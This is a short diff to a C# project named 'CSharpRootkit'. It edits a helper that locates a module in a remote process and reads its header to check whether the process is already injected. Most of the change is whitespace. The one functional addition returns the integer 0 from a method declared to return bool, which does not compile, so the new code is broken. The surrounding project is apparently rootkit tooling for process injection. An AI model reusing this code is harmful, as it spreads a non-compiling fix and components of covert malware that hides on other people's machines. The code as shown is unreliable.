@@ -338,7 +338,7 @@ namespace CSharpRootkit
 
         }
 
-        public static bool processHasInjectionFlag(IntPtr hProcess, out bool isInjected) 
+        public static bool processHasInjectionFlag(IntPtr hProcess, out bool isInjected)
         {
             isInjected = false;
 
@@ -355,10 +355,15 @@ namespace CSharpRootkit
                     module = Utils32.GetRemoteModuleHandle32Bit(hProcess, null);
                 }
             }
-            catch 
+            catch
             {
                 return false;
             }
+            if (module == 0) 
+            {
+                return 0;
+            }
+
             ulong headerLocation = module + (uint)Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));
 
             IntPtr buffer = Marshal.AllocHGlobal(headerString.Length + 1);//+1 for the null terminator
